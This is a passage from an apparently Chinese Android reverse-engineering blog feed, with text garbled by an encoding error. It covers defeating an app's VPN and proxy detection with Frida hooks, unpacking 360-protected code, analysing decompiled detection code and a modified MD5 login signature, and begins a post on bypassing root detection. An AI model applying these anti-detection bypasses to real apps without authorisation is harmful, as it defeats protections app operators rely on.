punctuation">&#123;</span><span class="token class-name">NetworkInterface</span> next <span class="token operator">=</span> networkInterfaces<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"getNameè·å¾—ç½‘ç»œè®¾å¤‡åç§°="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"getDisplayNameè·å¾—ç½‘ç»œè®¾å¤‡æ˜¾ç¤ºåç§°="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">getDisplayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"getIndexè·å¾—ç½‘ç»œæ¥å£çš„ç´¢å¼•="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"isUpæ˜¯å¦å·²ç»å¼€å¯å¹¶è¿è¡Œ="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">isUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"isBoopbackæ˜¯å¦ä¸ºå›è°ƒæ¥å£="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">isLoopback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"**********************"</span> <span class="token operator">+</span> count<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SocketException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><li>ä¸Šé¢ä»£ç å°±æ˜¯è·å–vpn åç§°ä»€ä¹ˆå„ç§ä¿¡æ¯çš„ä»£ç .æœ‰äº†ä¸Šè¯‰ä»£ç æˆ‘å°±æ¥ç¼–å†™frida hook vpnæ£€æµ‹çš„hookè„šæœ¬</li></ul><h2 id="æµ‹è¯•æ¡ˆä¾‹"><a href="#æµ‹è¯•æ¡ˆä¾‹" class="headerlink" title="æµ‹è¯•æ¡ˆä¾‹"></a>æµ‹è¯•æ¡ˆä¾‹</h2><ul><li>æˆ‘ä»¬æ‰“å¼€å°é»„é¸ŸæŠ“åŒ…å·¥å…·ã€‚ç„¶åæ‰“å¼€è½¯ä»¶ã€‚å¯ä»¥çœ‹åˆ°æ£€æµ‹vpnã€‚å› ä¸ºå°é»„é¸Ÿè¿™ä¸ªå°±æ˜¯åŸºäº vpnçš„æŠ“åŒ…å·¥å…·ã€‚é‚£ä¹ˆå¦‚æœç»•è¿‡å‘¢ã€‚(1)æˆ‘ä»¬å°±éœ€è¦å®šä½è¿™ä¸ªæ£€æµ‹æ˜¯åœ¨å“ªä¸ªå‡½æ•°ã€‚ç„¶åhookæ£€æµ‹å‡½æ•°ç»•è¿‡ã€‚(2)å¦å¤–æˆ‘ä»¬ä¹Ÿè¯´äº†æˆ‘ä»¬çŸ¥é“å®‰å“å¦‚ä½•è·å–vpnåç§°çš„ä»£ç æˆ‘ä»¬å¯ä»¥hookæ£€æµ‹åˆ°çš„åç§°ä¿®æ”¹æˆå…¶ä»–åå­—è¿™ä¸å°±ç»•è¿‡äº†.ä¸¤æ­¥éƒ½èƒ½ç»•è¿‡ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306020943617.png" alt="æ£€æµ‹vpn"></p></ul><h2 id="å®šä½æ€è·¯"><a href="#å®šä½æ€è·¯" class="headerlink" title="å®šä½æ€è·¯"></a>å®šä½æ€è·¯</h2><ul><li>hookè¿™ä¸ªæ¸©é¦¨æç¤º è¿™ä¸ªå¼¹å‡ºçš„æ¡†å®šä½æ£€æµ‹å‡½æ•°</li><li>hook vpnæ£€æµ‹å‡½æ•° ä¿®æ”¹è·å–åˆ°çš„vpnåç§°</li><li>hook vpnæ£€æµ‹å‡½æ•° ä¿®æ”¹è°ƒç”¨æ£€æµ‹vpnå‡½æ•°çš„è¿”å›å€¼</li><li>ç¬¬ä¸€ä¸ªæˆ‘ä»¬ä¸çŸ¥é“å¦‚ä½•è¿›è¡Œhookã€‚æˆ‘ä»¬åªçŸ¥é“å®‰å“æ˜¯å¦‚ä½•è·å–vpnçš„é‚£ä¹ˆæˆ‘ä»¬ç¼–å†™hookè„šæœ¬è¿›è¡Œå®šä½ã€‚ç›´æ¥å®šä½åˆ°ã€‚hookè„šæœ¬å‘å¸ƒåˆ°é¢‘é“ã€‚è¯·åˆ°é¢‘é“ä¸‹è½½ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306020954590.png" alt="æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç›´æ¥hookæˆåŠŸèƒ½"></p><li>æˆ‘ä»¬è¿›ä¸€æ­¥åˆ†æä¸‹è¿™ä¸ªæ£€æµ‹å‡½æ•°ã€‚ç”¨jadxæ‰“å¼€appã€‚é™æ€åˆ†æä¸€ä¸‹ã€‚ä¸€çœ‹appè¢«åŠ å›ºäº†ã€‚è¿™ä¸ª360åŠ å›ºæˆ‘ä»¬å¸¸è§„ç”¨frida-dexdump blackdex è¿›è¡Œè„±å£³ã€‚ä½†æ˜¯ç»è¿‡æˆ‘æµ‹è¯•ã€‚è¿™ä¸¤ä¸ªéƒ½æ²¡æœ‰è„±æ‰å£³ã€‚è¿™ä¸ªå£³å­å‡çº§äº†ã€‚é‚£æˆ‘ä»¬åªå¥½ç¥­å‡ºã€‚æˆ‘ä»¬ä¿®æ”¹è¿‡çš„è„±å£³ç³»ç»Ÿã€‚æˆåŠŸè„±æ‰</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306020957949.png" alt="360åŠ å›º"></p></ul><h2 id="åˆ†æapp"><a href="#åˆ†æapp" class="headerlink" title="åˆ†æapp"></a>åˆ†æapp</h2><ul><li>æŠŠè„±å£³åçš„zipæ–‡ä»¶æ”¾åˆ°jadxé‡Œé¢ã€‚ç”±äºjadx åç¼–è¯‘ä¸å‡ºvpnæ£€æµ‹ä»£ç æˆ‘ä»¬ç”¨jebè¿›è¡Œåç¼–è¯‘ã€‚æˆ‘æŠŠå®Œæ•´æ£€æµ‹ä»£ç æ”¾å‡ºæ¥ä¸ºäº†è¿›ä¸€æ­¥äº†è§£æ˜¯å¦‚ä½•æ£€æµ‹çš„ã€‚ä¸ºäº†ä¿æŠ¤ç¨‹åºã€‚éƒ¨åˆ†å…³é”®ä»£ç æ›¿æ¢ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021001833.png" alt="æ£€æµ‹å‡½æ•°"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021002107.png" alt="vpnæ£€æµ‹"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>zzzzz<span class="token punctuation">.</span>lib_common<span class="token punctuation">.</span>utils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>content<span class="token punctuation">.</span></span><span class="token class-name">Context</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">ConnectivityManager</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">TextUtils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>zzzzz<span class="token punctuation">.</span>lib_common<span class="token punctuation">.</span>constant<span class="token punctuation">.</span></span><span class="token class-name">CommonConstant</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">NetworkInterface</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">SocketException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collections</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Iterator</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">timber<span class="token punctuation">.</span>log<span class="token punctuation">.</span></span><span class="token class-name">Timber</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CheckDevice</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isVpnUsed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Iterator</span> v0_1<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"com.zzzzz.shenji"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">CommonConstant</span><span class="token punctuation">.</span>PACKAGE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            v0_1 <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token class-name">NetworkInterface</span><span class="token punctuation">.</span><span class="token function">getNetworkInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">SocketException</span> v0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            v0<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> v2 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            label_10<span class="token operator">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>v0_1<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name">Object</span> v3 <span class="token operator">=</span> v0_1<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">NetworkInterface</span> v3_1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">NetworkInterface</span><span class="token punctuation">)</span>v3<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>v3_1<span class="token punctuation">.</span><span class="token function">isUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    v2 <span class="token operator">=</span> v3_1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//hookç‚¹</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>v2<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"tun"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>v2<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"ppp"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>v2<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"pptp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">goto</span> label_10<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name">Timber</span><span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"VPNname %s"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>v2<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">SocketException</span> v0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>        v0<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isWifiProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"com.zzzzz.shenji"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">CommonConstant</span><span class="token punctuation">.</span>PACKAGE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> v0 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"http.proxyHost"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> v2 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"http.proxyPort"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>v2 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            v2 <span class="token operator">=</span> <span class="token string">"-1"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Timber</span><span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"ä»£ç†proxyAddress %s"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>v0<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Timber</span><span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"ä»£ç†proxyPort %s"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token class-name">TextUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">vpnnetworkCheck</span><span class="token punctuation">(</span><span class="token class-name">Context</span> arg2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"com.zzzzz.shenji"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">CommonConstant</span><span class="token punctuation">.</span>PACKAGE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ConnectivityManager</span> v2_1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ConnectivityManager</span><span class="token punctuation">)</span>arg2<span class="token punctuation">.</span><span class="token function">getSystemService</span><span class="token punctuation">(</span><span class="token string">"connectivity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> v2_1<span class="token punctuation">.</span><span class="token function">getNetworkCapabilities</span><span class="token punctuation">(</span>v2_1<span class="token punctuation">.</span><span class="token function">getActiveNetwork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasTransport</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> v2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            v2<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></ul><h2 id="å®šä½å¼¹çª—"><a href="#å®šä½å¼¹çª—" class="headerlink" title="å®šä½å¼¹çª—"></a>å®šä½å¼¹çª—</h2><ul><li>ä¸Šä¸€æ­¥æˆ‘ä»¬åˆ†æäº†æ£€æµ‹ä»£ç æˆ‘ä»¬è¿™æ¥åˆ†æè¿™ä¸ªå¼¹çª—å¦‚ä½•hookåˆ†æä¸€ä¸‹ä»£ç ã€‚æŸ¥æ‰¾ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021008821.png"></p><li>çœ‹åˆ°äº†æ£€æµ‹ç‚¹ã€‚ç”±äºè¿™æ˜¯è¡¨é¢æ‰€ä»¥æˆ‘ä»¬è¦æ·±å…¥è¿›è¡Œåˆ†æåˆ†æè°ƒç”¨é€»è¾‘ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021009938.png"></p><li>ä¸‹å›¾è°ƒç”¨è¿™ä¸ªsetMessage  è¿”å›æ˜¯ä»–è‡ªå·±å®šä¹‰ç±»é‚£æˆ‘ä»¬åªæœ‰ã€‚ä»å‡½æ•°å‚æ•°å…¥æ‰‹æ¥å®šä½äº†ã€‚å‘ç°æ˜¯è¿™ä¸ª this.binding.textContent.setText(charSequence); ã€‚æˆ‘ä»¬çœ‹ è¿½è¸ªåˆ°  public final TextView textContent; å¯ä»¥çœ‹åˆ°import android.widget.TextView;è¿™ä¸ªå±äºå®‰å“çš„é‚£æˆ‘ä»¬å°±hookè¿™ä¸ªçœ‹çœ‹</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021012166.png"></p><li>hookå…³é”®å‡½æ•°ã€‚æˆ‘ä»¬hookåˆ°äº†ã€‚è¿™ä¸ªä»£ç ä½ ä»¬è‡ªå·±å†™å°±è¡Œäº†ã€‚æˆ‘å°±ä¸æ”¾äº†ã€‚åˆ°è¿™é‡Œæˆ‘ä»¬å·²ç»æå®šæŠ“åŒ…äº†ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021016586.png"></p></ul><h2 id="ç®—æ³•å®šä½"><a href="#ç®—æ³•å®šä½" class="headerlink" title="ç®—æ³•å®šä½"></a>ç®—æ³•å®šä½</h2><ul><li>æ¥åˆ°ç™»é™†ç•Œé¢ç‚¹å‡»ç™»é™†æŠ“åŒ…ã€‚å’‹çœ¼ä¸€çœ‹ã€‚è¿™å’Œmd5ç±»ä¼¼ã€‚æå‡ºæˆ‘ä»¬çš„ç®—æ³•é€šæ€è„šæœ¬è¿›è¡Œã€‚hookå‘ç°hookä¸åˆ°</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021021011.png"></p><li>æ”¾å¤§æ‹›äº†æˆ‘ä»¬ç¥­å‡ºæˆ‘è‡ªå·±æ€»ç»“çš„hookè„šæœ¬æ¥hookä¸€ä¸‹ã€‚hookåˆ°äº†ã€‚è‡ªå·±å†™çš„æœç„¶æ˜¯æ¯”è¾ƒä¸é”™å“ˆå“ˆå“ˆã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021024412.png"></p><li>çœ‹äº†ä¸€ä¸‹åœ¨æ ‡å‡†md5å¾—åˆ°ç»“æœä»¥åå¯¹ç»“æœè¿›è¡ŒåŠ å·¥äº†ä¸€ä¸‹ã€‚éš¾æ€ªhookä¸åˆ°ã€‚ã€‚ã€‚ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021026252.png" alt="æˆªå›¾"></p></ul><h2 id="hookvpnè„šæœ¬ä¸‹è½½"><a href="#hookvpnè„šæœ¬ä¸‹è½½" class="headerlink" title="hookvpnè„šæœ¬ä¸‹è½½"></a>hookvpnè„šæœ¬ä¸‹è½½</h2><ul><li>åˆ†æåˆ°è¿™é‡Œå°±åˆ†æå®Œäº†ã€‚ä¸‹è½½åœ°å€:https://t.me/SoftwareUpdateChannel/196</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŸé¢œè‰²appæŠ–é˜´åŠ å¯†ç®—æ³•åˆ†æ-è¿‡rootæ£€æµ‹å’Œsoå±‚åˆæ¢</title>
      <link href="/androidreverse/2023/04/articles/c46552d11b0f0c1d/"/>
      <url>/androidreverse/2023/04/articles/c46552d11b0f0c1d/</url>
      
        <content type="html"><![CDATA[<h2 id="appæ ·æœ¬"><a href="#appæ ·æœ¬" class="headerlink" title="appæ ·æœ¬"></a>appæ ·æœ¬</h2><ul><li>é—²æ¥æ— äº‹æä¸€ä¸ªapp,ä¸çŸ¥é“æ‰¾å•¥ç›®æ ‡æã€‚ç»“æœç¿»ç€ç¿»ç€æ‰¾åˆ°ä»Šå¤©çš„ä¸»è§’é‚£å°±æå®ƒäº†ã€‚ä¼ è¯´ä¸­çš„å’ŒæŠ–éŸ³åŒåçš„æŠ–é˜´appã€‚å¸¸è§„æ“ä½œä¸‹è½½appå®‰è£…æ‰“å¼€ã€‚ä»‹äºè¿™ä¸ªappæ˜¯æœ‰é¢œè‰²çš„æ‰€ä»¥æœ¬æ¬¡å…¨éƒ¨ä¸æ‰“ç ç›´æ¥æã€‚</li></ul><h2 id="è¿‡rootæ£€æµ‹"><a href="#è¿‡rootæ£€æµ‹" class="headerlink" title="è¿‡rootæ£€æµ‹"></a>è¿‡rootæ£€æµ‹</h2><ul><li>æ‰“å¼€appä¸€çœ‹è¿™ä¸ªæç¤ºè¿™æˆ‘çš„æš´è„¾æ°”èƒ½å¿ä¹ˆã€‚æ£€æµ‹åˆ°æ‰‹æœºrootã€‚ã€‚è¯´æˆ‘ä½¿ç”¨çš„æ¨¡æ‹Ÿå™¨æˆ–è€…è®¾å¤‡å·²ç»è¢«rootäº†ã€‚<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281431776.png" alt="æ£€æµ‹åˆ°æ‰‹æœºroot"></p></li><li>é¦–å…ˆæ‹–åˆ°jadxçœ‹çœ‹æ˜¯å¦åŠ å£³ã€‚å‘ç°æ²¡æœ‰è¢«åŠ å£³ã€‚ä½†æ˜¯appæ··æ·†äº†ã€‚æ¡æ“¦è¿™é˜²æŠ¤çš„è¿™ä¹ˆæµå¼Šä¹ˆ</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281435765.png" alt="æ··æ·†æˆªå›¾"></p><li>é¦–å…ˆå¼€å¯æˆ‘ä»¬çš„firdaçœ‹çœ‹è¿™è´§æ£€æµ‹ä¸æ£€æŸ¥fridaä»€ä¹ˆçš„ã€‚å‘ç°ä¸æ£€æŸ¥ã€‚è¿™å°å­è¿˜ç®—è¯†ç›¸ã€‚è¿™æ—¶å€™æˆ‘ä»¬æƒ³åˆ°å¯ä»¥ç”¨objection çš„disable rootæ¥å¹²æ‰rootæ£€æµ‹ã€‚ä½†æ˜¯ä¹Ÿæœ‰å¯èƒ½å¹²ä¸æ‰ã€‚å¦‚æœappæ£€æµ‹rootæ‰‹æ®µæ¯”è¾ƒå…¨é¢å‘¢ã€‚æ‰€ä»¥æˆ‘ä»¬ç”¨è‡ªå·±å†™çš„firda rootæ£€æµ‹å®šä½è„šæœ¬æ¥æµ‹è¯•ä¸€ä¸‹</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281437899.png" alt="æ²¡æœ‰æ£€æµ‹frida"></p><li>ç”¨è‡ªå·±å†™çš„rootå®šä½æ£€æµ‹è„šæœ¬æ¥çœ‹çœ‹ã€‚è¿™æ ·hook ã€‚ç„¶åç‚¹å‡»ç¡®å®šã€‚è¿›ç¨‹æ²¡æœ‰é€€å‡ºæˆ‘ä»¬å·²ç»hookäº†ã€‚ç„¶ååœ¨æ‰“å¼€appçœ‹æ“ä½œ</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281440654.png" alt="hookæˆªå›¾"></p><li>æ‰“å¼€appçœ‹çœ‹æ˜¯å¦è§¦å‘äº†rootæ£€æµ‹è„šæœ¬ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281442634.png" alt="æ£€æµ‹ç‚¹åœ¨"></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">at java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>File<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>Native Method<span class="token punctuation">)</span>   at com<span class="token punctuation">.</span>blankj<span class="token punctuation">.</span>utilcode<span class="token punctuation">.</span>util<span class="token punctuation">.</span>w<span class="token punctuation">.</span><span class="token function">q</span><span class="token punctuation">(</span>DeviceUtils<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">)</span>   at com<span class="token punctuation">.</span>niming<span class="token punctuation">.</span>weipa<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>splash<span class="token punctuation">.</span>SplashActivity<span class="token punctuation">.</span><span class="token constant">A</span><span class="token punctuation">(</span>SplashActivity<span class="token punctuation">.</span>kt<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>   at com<span class="token punctuation">.</span>niming<span class="token punctuation">.</span>weipa<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>splash<span class="token punctuation">.</span>SplashActivity<span class="token punctuation">.</span><span class="token constant">K</span><span class="token punctuation">(</span>SplashActivity<span class="token punctuation">.</span>kt<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">)</span>   at com<span class="token punctuation">.</span>niming<span class="token punctuation">.</span>weipa<span class="token punctuation">.</span>ui<span class="token punctuation">.</span>splash<span class="token punctuation">.</span>SplashActivity<span class="token punctuation">.</span><span class="token function">initView</span><span class="token punctuation">(</span>SplashActivity<span class="token punctuation">.</span>kt<span class="token 